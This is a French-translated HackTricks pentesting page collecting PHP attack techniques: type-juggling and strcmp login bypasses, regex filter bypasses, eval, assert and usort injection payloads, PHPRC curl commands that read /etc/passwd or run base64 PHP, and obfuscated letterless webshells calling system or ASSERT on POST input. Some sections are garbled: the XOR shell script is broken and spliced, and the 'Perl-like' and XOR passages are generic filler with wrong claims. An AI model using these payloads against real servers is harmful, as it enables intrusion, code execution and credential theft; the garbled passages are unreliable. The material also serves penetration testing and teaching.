# Astuces PHP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Emplacement courant des cookies :

Cela est √©galement valable pour les cookies de phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Emplacements:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Contournement des comparaisons en PHP

### Comparaisons l√¢ches / Type Juggling ( == )

Si `==` est utilis√© en PHP, il peut y avoir des cas inattendus o√π la comparaison ne se comporte pas comme pr√©vu. Cela est d√ª au fait que "==" ne compare que des valeurs transform√©es du m√™me type. Si vous souhaitez √©galement comparer le type des donn√©es compar√©es, vous devez utiliser `===`.

Tableaux de comparaison en PHP : [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Une cha√Æne de caract√®res qui ne commence pas par un nombre est √©gale √† un nombre
* `"0xAAAA" == "43690" -> True` Les cha√Ænes compos√©es de nombres au format d√©cimal ou hexad√©cimal peuvent √™tre compar√©es √† d'autres nombres/cha√Ænes avec un r√©sultat True si les nombres sont identiques (les nombres dans une cha√Æne sont interpr√©t√©s comme des nombres)
* `"0e3264578" == 0 --> True` Une cha√Æne de caract√®res commen√ßant par "0e" et suivie de n'importe quoi sera √©gale √† 0
* `"0X3264578" == 0X --> True` Une cha√Æne de caract√®res commen√ßant par "0" et suivie de n'importe quelle lettre (X peut √™tre n'importe quelle lettre) et suivie de n'importe quoi sera √©gale √† 0
* `"0e12334" == "0" --> True` C'est tr√®s int√©ressant car dans certains cas, vous pouvez contr√¥ler la cha√Æne d'entr√©e "0" et certains contenus qui sont hach√©s et compar√©s √† celle-ci. Par cons√©quent, si vous pouvez fournir une valeur qui cr√©era un hachage commen√ßant par "0e" et sans aucune lettre, vous pourriez contourner la comparaison. Vous pouvez trouver des **cha√Ænes d√©j√† hach√©es** avec ce format ici : [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Toute lettre dans une cha√Æne est √©gale √† l'entier 0

Plus d'informations sur [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

Le **Type Juggling** affecte √©galement la fonction `in_array()` par d√©faut (vous devez d√©finir le troisi√®me argument sur true pour effectuer une comparaison stricte) :
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Si cette fonction est utilis√©e pour **toute v√©rification d'authentification** (comme la v√©rification du mot de passe) et que l'utilisateur contr√¥le un c√¥t√© de la comparaison, il peut envoyer un tableau vide √† la place d'une cha√Æne de caract√®res en tant que valeur du mot de passe (`https://example.com/login.php/?username=admin&password[]=`) et contourner cette v√©rification :
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
La m√™me erreur se produit avec `strcasecmp()`

### Conversion de type strict

M√™me si `===` est utilis√©, il peut y avoir des erreurs qui rendent la comparaison vuln√©rable √† la conversion de type. Par exemple, si la comparaison convertit les donn√©es en un type d'objet diff√©rent avant de les comparer :
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

La fonction `preg_match()` peut √™tre utilis√©e pour **valider l'entr√©e de l'utilisateur** (elle v√©rifie si un **mot/regex** de la **liste noire** est **pr√©sent** dans l'**entr√©e de l'utilisateur** et si ce n'est pas le cas, le code peut continuer son ex√©cution).

#### Contournement de la nouvelle ligne

Cependant, lors de la d√©limitation du d√©but de l'expression r√©guli√®re, `preg_match()` **v√©rifie uniquement la premi√®re ligne de l'entr√©e de l'utilisateur**, donc si vous parvenez √† **envoyer** l'entr√©e sur **plusieurs lignes**, vous pourriez contourner cette v√©rification. Exemple :
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Pour contourner cette v√©rification, vous pouvez **envoyer la valeur avec des sauts de ligne urlencod√©s** (`%0A`) ou si vous pouvez envoyer des **donn√©es JSON**, envoyez-les sur **plusieurs lignes** :
```php
{
"cmd": "cat /etc/passwd"
}
```
Trouvez un exemple ici: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Contournement de l'erreur de longueur**

(Ce contournement a √©t√© apparemment test√© sur PHP 5.2.5 et je n'ai pas r√©ussi √† le faire fonctionner sur PHP 7.3.15)\
Si vous pouvez envoyer √† `preg_match()` une **entr√©e tr√®s grande** valide, il **ne pourra pas la traiter** et vous pourrez **contourner** la v√©rification. Par exemple, si elle met en liste noire un JSON, vous pourriez envoyer:
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
De : [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

### Type Juggling pour l'obfuscation en PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Ex√©cution apr√®s redirection (EAR)

Si PHP redirige vers une autre page mais qu'aucune fonction **`die`** ou **`exit`** n'est appel√©e apr√®s que l'en-t√™te `Location` soit d√©fini, PHP continue d'ex√©cuter et d'ajouter les donn√©es au corps de la page :
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Plus de astuces

* **register\_globals**: Dans **PHP < 4.1.1.1** ou si mal configur√©, **register\_globals** peut √™tre actif (ou leur comportement est imit√©). Cela implique que dans les variables globales comme $\_GET si elles ont une valeur par exemple $\_GET\["param"]="1234", vous pouvez y acc√©der via **$param. Par cons√©quent, en envoyant des param√®tres HTTP, vous pouvez √©craser les variables** qui sont utilis√©es dans le code.
* Les **cookies PHPSESSION du m√™me domaine sont stock√©s au m√™me endroit**, donc si dans un domaine **diff√©rents cookies sont utilis√©s dans diff√©rents chemins**, vous pouvez faire en sorte qu'un chemin **acc√®de au cookie du chemin** en d√©finissant la valeur du cookie de l'autre chemin.\
De cette fa√ßon, si **les deux chemins acc√®dent √† une variable portant le m√™me nom**, vous pouvez faire en sorte que **la valeur de cette variable dans le chemin 1 s'applique au chemin 2**. Et ensuite, le chemin 2 consid√©rera les variables du chemin 1 comme valides (en donnant au cookie le nom qui lui correspond dans le chemin 2).
* Lorsque vous avez les **noms d'utilisateur** des utilisateurs de la machine. V√©rifiez l'adresse : **/\~\<NOM_UTILISATEUR>** pour voir si les r√©pertoires php sont activ√©s.
* [**LFI et RCE en utilisant des wrappers php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Ces fonctions sont g√©n√©ralement utilis√©es en PHP pour **g√©n√©rer des hachages √† partir de mots de passe** et pour **v√©rifier** si un mot de passe est correct par rapport √† un hachage.\
Les algorithmes pris en charge sont : `PASSWORD_DEFAULT` et `PASSWORD_BCRYPT` (commence par `$2y$`). Notez que **PASSWORD\_DEFAULT est souvent identique √† PASSWORD\_BCRYPT**. Et actuellement, **PASSWORD\_BCRYPT** a une **limite de taille en entr√©e de 72 octets**. Par cons√©quent, lorsque vous essayez de hacher quelque chose de plus grand que 72 octets avec cet algorithme, seuls les premiers 72 octets seront utilis√©s :
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Contournement des en-t√™tes HTTP en abusant des erreurs PHP

Si une **page PHP affiche des erreurs et renvoie une partie de l'entr√©e fournie par l'utilisateur**, l'utilisateur peut faire en sorte que le serveur PHP renvoie un **contenu suffisamment long** pour que lorsqu'il essaie d'**ajouter les en-t√™tes** √† la r√©ponse, le serveur g√©n√®re une erreur.\
Dans le sc√©nario suivant, l'**attaquant a provoqu√© des erreurs importantes** sur le serveur, et comme vous pouvez le voir √† l'√©cran, lorsque PHP a essay√© de **modifier les informations d'en-t√™te, il n'a pas pu** (par exemple, l'en-t√™te CSP n'a pas √©t√© envoy√© √† l'utilisateur) :

![](<../../../.gitbook/assets/image (465).png>)

## Ex√©cution de code

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[V√©rifiez ceci pour plus de fonctions PHP utiles](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Pour ex√©cuter le code dans l'argument "replace", il est n√©cessaire d'avoir au moins une correspondance.\
Cette option de preg\_replace a √©t√© **d√©pr√©ci√©e √† partir de PHP 5.5.0.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

Cette fonction en php vous permet d'**ex√©cuter du code √©crit dans une cha√Æne de caract√®res** afin de **retourner vrai ou faux** (et en fonction de cela, modifier l'ex√©cution). G√©n√©ralement, la variable utilisateur sera ins√©r√©e au milieu d'une cha√Æne de caract√®res. Par exemple :\
`assert("strpos($_GET['page']),'..') === false")` --> Dans ce cas, pour obtenir une **RCE**, vous pourriez faire :
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Vous devrez **modifier** la syntaxe du code, **ajouter** votre **charge utile**, puis **la corriger √† nouveau**. Vous pouvez utiliser des op√©rations logiques telles que "**et**" ou "%26%26" ou "|". Notez que "ou" ou "||" ne fonctionnent pas car si la premi√®re condition est vraie, notre charge utile ne sera pas ex√©cut√©e. De la m√™me mani√®re, ";" ne fonctionne pas car notre charge utile ne sera pas ex√©cut√©e.

**Une autre option** consiste √† ajouter √† la cha√Æne l'ex√©cution de la commande : `'.highlight_file('.passwd').'`

**Une autre option** (si vous avez le code interne) consiste √† modifier une variable pour alt√©rer l'ex√©cution : `$file = "hola"`

### **RCE via usort()**

Cette fonction est utilis√©e pour trier un tableau d'√©l√©ments √† l'aide d'une fonction sp√©cifique.\
Pour abuser de cette fonction :
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Vous pouvez √©galement utiliser **//** pour commenter le reste du code.

Pour d√©couvrir le nombre de parenth√®ses que vous devez fermer :

* `?order=id;}//` : nous obtenons un message d'erreur (`Parse error: syntax error, unexpected ';'`). Il nous manque probablement une ou plusieurs parenth√®ses.
* `?order=id);}//` : nous obtenons un **avertissement**. Cela semble correct.
* `?order=id));}//` : nous obtenons un message d'erreur (`Parse error: syntax error, unexpected ')' i`). Nous avons probablement trop de parenth√®ses fermantes.

### **RCE via .httaccess**

Si vous pouvez **uploader** un **.htaccess**, vous pouvez **configurer** plusieurs choses et m√™me ex√©cuter du code (en configurant les fichiers avec l'extension .htaccess pour qu'ils puissent √™tre **ex√©cut√©s**).

Diff√©rentes coquilles .htaccess peuvent √™tre trouv√©es [ici](https://github.com/wireghoul/htshells)

### RCE via les variables d'environnement

Si vous trouvez une vuln√©rabilit√© qui vous permet de **modifier les variables d'environnement en PHP** (et une autre pour uploader des fichiers, bien qu'avec plus de recherche cela puisse √™tre contourn√©), vous pouvez abuser de ce comportement pour obtenir **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path) : Cette variable d'environnement vous permet de charger des biblioth√®ques arbitraires lors de l'ex√©cution d'autres binaires (bien que dans ce cas cela puisse ne pas fonctionner).
* **`PHPRC`** : Indique √† PHP **o√π se trouve son fichier de configuration**, g√©n√©ralement appel√© `php.ini`. Si vous pouvez uploader votre propre fichier de configuration, utilisez `PHPRC` pour le pointer vers PHP. Ajoutez une entr√©e **`auto_prepend_file`** sp√©cifiant un deuxi√®me fichier upload√©. Ce deuxi√®me fichier contient du **code PHP normal, qui est ensuite ex√©cut√©** par le runtime PHP avant tout autre code.
1. Uploadez un fichier PHP contenant notre code de coquille
2. Uploadez un deuxi√®me fichier contenant une directive **`auto_prepend_file`** indiquant au pr√©processeur PHP d'ex√©cuter le fichier que nous avons upload√© √† l'√©tape 1
3. D√©finissez la variable `PHPRC` sur le fichier que nous avons upload√© √† l'√©tape 2.
* Obtenez plus d'informations sur la fa√ßon d'ex√©cuter cette cha√Æne [**√† partir du rapport original**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - une autre option
* Si vous ne pouvez pas uploader de fichiers, vous pouvez utiliser dans FreeBSD le "fichier" `/dev/fd/0` qui contient le **`stdin`**, √©tant le **corps** de la requ√™te envoy√©e √† `stdin` :
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ou pour obtenir RCE, activez **`allow_url_include`** et pr√©fixez un fichier avec du **code PHP en base64** :
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technique [**√† partir de ce rapport**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Analyse statique PHP

V√©rifiez si vous pouvez ins√©rer du code dans les appels √† ces fonctions (√† partir de [ici](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)) :
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Si vous d√©boguez une application PHP, vous pouvez activer l'affichage des erreurs globalement dans `/etc/php5/apache2/php.ini` en ajoutant `display_errors = On` et red√©marrer Apache : `sudo systemctl restart apache2`

### D√©obfuscation du code PHP

Vous pouvez utiliser le **site web**[ **www.unphp.net**](http://www.unphp.net) **pour d√©obfusquer le code PHP.**

## Enveloppes et protocoles PHP

Les enveloppes et protocoles PHP pourraient vous permettre de **contourner les protections d'√©criture et de lecture** d'un syst√®me et de le compromettre. Pour [**plus d'informations, consultez cette page**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug RCE non authentifi√©

Si vous constatez que **Xdebug** est **activ√©** dans la sortie de `phpconfig()`, vous devriez essayer d'obtenir une RCE via [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variables variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Exploitation de RCE en abusant de $\_GET\["a"]\($\_GET\["b"])

Si vous pouvez **cr√©er un nouvel objet d'une classe arbitraire** sur une page, vous pourriez √™tre en mesure d'obtenir une RCE. Consultez la page suivante pour en savoir plus :

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Ex√©cution de PHP sans lettres

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Utilisation d'octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

L'op√©rateur XOR (ou exclusif) est une op√©ration logique qui est souvent utilis√©e en programmation pour effectuer des manipulations sur les bits. XOR renvoie vrai (1) si les deux bits en entr√©e sont diff√©rents, et faux (0) si les deux bits sont identiques.

En termes de s√©curit√© informatique, XOR est souvent utilis√© pour chiffrer et d√©chiffrer des donn√©es. Il peut √™tre utilis√© pour masquer des informations sensibles en les combinant avec une cl√© secr√®te. Le chiffrement XOR est consid√©r√© comme faible en termes de s√©curit√©, car il est vuln√©rable √† certaines attaques, telles que l'analyse fr√©quentielle.

Cependant, XOR peut √©galement √™tre utilis√© de mani√®re cr√©ative pour contourner certaines protections de s√©curit√©. Par exemple, en utilisant XOR avec une valeur sp√©cifique, il est possible de contourner les filtres de s√©curit√© qui v√©rifient les caract√®res sp√©ciaux dans les entr√©es utilisateur.

En r√©sum√©, XOR est un op√©rateur logique puissant qui peut √™tre utilis√© √† la fois pour la s√©curit√© et pour contourner certaines protections. Cependant, il est important de comprendre ses limites et de l'utiliser de mani√®re appropri√©e pour √©viter les vuln√©rabilit√©s.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### Code shell XOR facile

Selon [**ce compte rendu**](https://mgp25.com/ctf/Web-challenge/), il est possible de g√©n√©rer un code shell XOR facile de cette mani√®re :
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Donc, si vous pouvez **ex√©cuter du PHP arbitraire sans chiffres ni lettres**, vous pouvez envoyer une requ√™te comme celle-ci en abusant de cette charge utile pour ex√©cuter du PHP arbitraire :
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Pour une explication plus d√©taill√©e, consultez [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Shellcode XOR (√† l'int√©rieur de eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl-like

Perl est un langage de programmation polyvalent et puissant qui offre de nombreuses fonctionnalit√©s utiles pour le d√©veloppement web. Dans cet article, nous allons explorer quelques astuces Perl-like que vous pouvez utiliser dans vos scripts PHP pour am√©liorer votre productivit√© et votre efficacit√©.

#### Variables sp√©ciales

Perl offre plusieurs variables sp√©ciales qui peuvent √™tre tr√®s utiles lors de la manipulation de cha√Ænes de caract√®res. Voici quelques-unes de ces variables et leur √©quivalent en PHP :

- `$@` : contient le dernier message d'erreur g√©n√©r√© par une expression r√©guli√®re.
- `$&` : contient la partie de la cha√Æne qui correspond √† la derni√®re expression r√©guli√®re.
- `$1`, `$2`, `$3`, ... : contiennent les parties correspondantes de la derni√®re expression r√©guli√®re.

En utilisant ces variables sp√©ciales, vous pouvez effectuer des op√©rations avanc√©es sur les cha√Ænes de caract√®res de mani√®re plus concise et √©l√©gante.

#### Op√©rateurs de substitution

Perl propose √©galement des op√©rateurs de substitution qui permettent de rechercher et de remplacer des parties d'une cha√Æne de caract√®res. Voici quelques exemples d'op√©rateurs de substitution Perl et leur √©quivalent en PHP :

- `s/regex/replacement/` : recherche la premi√®re occurrence d'une expression r√©guli√®re dans une cha√Æne et la remplace par une autre cha√Æne.
- `s/regex/replacement/g` : recherche toutes les occurrences d'une expression r√©guli√®re dans une cha√Æne et les remplace par une autre cha√Æne.
- `s/regex/replacement/i` : recherche la premi√®re occurrence d'une expression r√©guli√®re dans une cha√Æne, en ignorant la casse, et la remplace par une autre cha√Æne.

Ces op√©rateurs de substitution sont tr√®s pratiques pour effectuer des modifications rapides et pr√©cises sur les cha√Ænes de caract√®res.

#### Fonctions de manipulation de cha√Ænes

Perl propose √©galement de nombreuses fonctions de manipulation de cha√Ænes qui peuvent √™tre tr√®s utiles lors du traitement de donn√©es. Voici quelques exemples de fonctions Perl et leur √©quivalent en PHP :

- `length($string)` : renvoie la longueur d'une cha√Æne de caract√®res.
- `substr($string, $start, $length)` : extrait une sous-cha√Æne d'une cha√Æne de caract√®res.
- `index($string, $substring)` : renvoie la position de la premi√®re occurrence d'une sous-cha√Æne dans une cha√Æne.
- `split($delimiter, $string)` : divise une cha√Æne en un tableau de sous-cha√Ænes en utilisant un d√©limiteur.

En utilisant ces fonctions de manipulation de cha√Ænes, vous pouvez effectuer des op√©rations complexes sur les donn√©es de mani√®re plus efficace.

En conclusion, en utilisant ces astuces Perl-like dans vos scripts PHP, vous pouvez am√©liorer votre productivit√© et votre efficacit√© lors du d√©veloppement web. N'h√©sitez pas √† les essayer et √† les adapter √† vos besoins sp√©cifiques.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
